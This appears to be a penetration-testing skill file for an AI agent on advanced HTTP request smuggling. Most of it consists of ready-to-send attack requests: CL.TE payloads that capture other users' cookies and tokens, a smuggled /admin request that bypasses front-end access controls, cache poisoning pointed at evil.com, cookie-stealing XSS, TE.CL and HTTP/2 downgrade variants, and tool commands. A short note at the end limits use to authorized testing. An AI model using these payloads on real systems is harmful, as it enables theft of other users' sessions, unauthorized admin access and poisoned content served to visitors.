---
name: http-smuggling-advanced
description: "Advanced HTTP request smuggling exploitation methodology. Extends the smuggling portion of cache-poisoning-smuggling. Use when CL.TE/TE.CL/TE.TE/H2.CL smuggling has already been confirmed. Covers chained exploitation (stealing credentials, bypassing ACLs, poisoning the web cache, XSS against other users) and HTTP/2 downgrade smuggling"
zh-signals: "在已确认 HTTP 请求走私后，覆盖链式利用（窃取凭据、绕过 ACL、缓存投毒）与 HTTP/2 降级走私的高级方法论。信号:请求走私,CL.TE,TE.CL,H2降级,链式利用"
when-to-use: >-
  Use when request smuggling (CL.TE/TE.CL/TE.TE/H2.CL/H2.TE) is already confirmed and you need
  advanced chained exploitation or HTTP/2 downgrade techniques.
metadata:
  tags: "http smuggling,request smuggling,desync,cl-te,te-cl,h2-smuggling,http2,downgrade smuggling,request smuggling"
  category: "exploit"
  mitre_attack: "T1190,T1557"
---

# Advanced HTTP Request Smuggling Exploitation

> **Prerequisite**: This skill focuses on **chained exploitation after the smuggling vulnerability is confirmed**

## ⛔ Further Reading

- Detection payloads for each smuggling variant → [references/smuggling-detection.md](references/smuggling-detection.md)
- H2C/H2 downgrade smuggling techniques → [references/h2-smuggling.md](references/h2-smuggling.md)

---

## Phase 0: Smuggling Type Quick Reference

```
What does the front end (FE) use to parse the request length? What does the back end (BE) use?

CL.TE: FE uses Content-Length → BE uses Transfer-Encoding
TE.CL: FE uses Transfer-Encoding → BE uses Content-Length
TE.TE: both use TE, but they handle malformed TE headers differently
H2.CL: FE uses HTTP/2 frame length → BE downgrades to HTTP/1.1 and uses CL
H2.TE: FE uses HTTP/2 → BE downgrades and uses TE

⛔ Only enter this skill's exploitation phase after smuggling has been confirmed
```

## Phase 1: CL.TE Smuggling Exploitation

### 1.1 Stealing Other Users' Requests

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 500
Content-Type: application/x-www-form-urlencoded

stolen=
```

**Principle:** The back end treats `POST /log ... stolen=` as the prefix of the next request → the next user's complete request is appended after `stolen=` → you can read their cookies/tokens

### 1.2 Bypassing Front-End ACLs

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 73
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

```

**Principle:** The front end only checks the first request (POST /) → it lets it through. The smuggled `GET /admin` reaches the back end directly → bypassing the front end's IP/path restrictions.

### 1.3 Poisoning the Web Cache

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

```

**Principle:** The smuggled GET request + malicious Host header → the back end returns a response containing `evil.com` → the front end caches this response → other users fetching `/static/main.js` receive the poisoned content.

### 1.4 Escalating Reflected XSS to Stored XSS

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com
X-Random: x
```

**Principle:** If `/search` has reflected XSS → the smuggled request turns the next user's response into a search result page containing the XSS payload → reflected becomes stored.

## Phase 2: TE.CL Smuggling Exploitation

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Key:** The front end correctly reads all chunked data based on TE. The back end only reads `78\r\n` based on CL=4, and the remaining `POST /admin ...` is treated as a separate new request.

## Phase 3: HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)

### 3.1 H2.CL Smuggling

```
HTTP/2 request (front end):
:method: POST
:path: /
:authority: target.com
content-length: 0

Smuggled HTTP/1.1 (what the back end sees):
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

**Principle:** HTTP/2 uses frame lengths and does not need CL. But when downgrading to HTTP/1.1, the wrong CL value makes the back end treat the extra data as a new request.

### 3.2 H2 Request Tunneling

```
Exploiting special headers in HTTP/2 HEADERS frames:
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

The TE header is usually ignored in HTTP/2, but it takes effect after the downgrade
→ this lets you construct a CL/TE mismatch
```

## Phase 4: Automated Detection and Exploitation

### Tools

```bash
# smuggler.py — automated detection
python3 smuggler.py -u https://target.com

# Burp Suite — HTTP Request Smuggler extension
# Install the extension → Scan → reports the smuggling type

# h2csmuggler — HTTP/2 cleartext upgrade smuggling
python3 h2csmuggler.py -x https://target.com -t /admin

# Manual curl verification (CL.TE)
curl -i -X POST https://target.com/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nG'
# If the second normal GET returns "GGET / HTTP/1.1 ..." 405 → smuggling exists
```

### How to Verify Successful Smuggling

```
Method 1: Timing difference
├─ Smuggle a request with a delay → observe the response time change

Method 2: Differential response
├─ Smuggle GET /404path → the next normal request returns 404

Method 3: Reflected request
├─ Smuggle a request to your own logging server
├─ Observe whether other users' requests are received

Method 4: OAST (Out-of-band)
├─ Smuggle with Host: burp-collaborator.net
├─ Check the DNS/HTTP requests received by Collaborator
```

## ⛔ Risk Control

- Request smuggling **affects other users** → use it only in authorized testing
- Use unique identifiers to distinguish your requests during testing
- Confirm with the timing difference method first → then proceed with exploitation
- Avoid sending large numbers of smuggled requests, which could make the service unavailable
